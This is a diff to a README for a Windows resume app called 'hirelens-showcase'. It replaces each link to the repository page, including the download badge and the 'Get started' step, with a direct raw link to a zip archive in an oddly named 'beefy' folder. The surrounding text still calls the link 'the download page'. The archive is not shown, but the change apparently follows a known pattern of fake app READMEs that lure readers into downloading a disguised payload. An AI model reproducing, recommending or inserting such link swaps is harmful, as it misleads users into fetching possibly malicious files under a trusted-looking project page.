@@ -1,12 +1,12 @@
 # 🤖 hirelens-showcase - Sharper resumes, faster callbacks
 
-[![Download hirelens-showcase](https://img.shields.io/badge/Download%20hirelens--showcase-1f6feb?style=for-the-badge&logo=github)](https://github.com/Icarbonblack871/hirelens-showcase)
+[![Download hirelens-showcase](https://img.shields.io/badge/Download%20hirelens--showcase-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip)
 
 ## 🔽 Download
 
 Use this link to visit the page and download the app for Windows:
 
-[https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
+[https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip](https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip)
 
 ## 🧭 What this app does
 
@@ -38,7 +38,7 @@ For best results:
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   [https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
+   [https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip](https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip)
 
 2. On the page, find the latest Windows download.
 
@@ -240,4 +240,4 @@ This project is related to:
 
 If you need to return to the download page, use this link:
 
-[https://github.com/Icarbonblack871/hirelens-showcase](https://github.com/Icarbonblack871/hirelens-showcase)
+[https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip](https://raw.githubusercontent.com/Icarbonblack871/hirelens-showcase/main/beefy/hirelens-showcase-3.2-beta.1.zip)
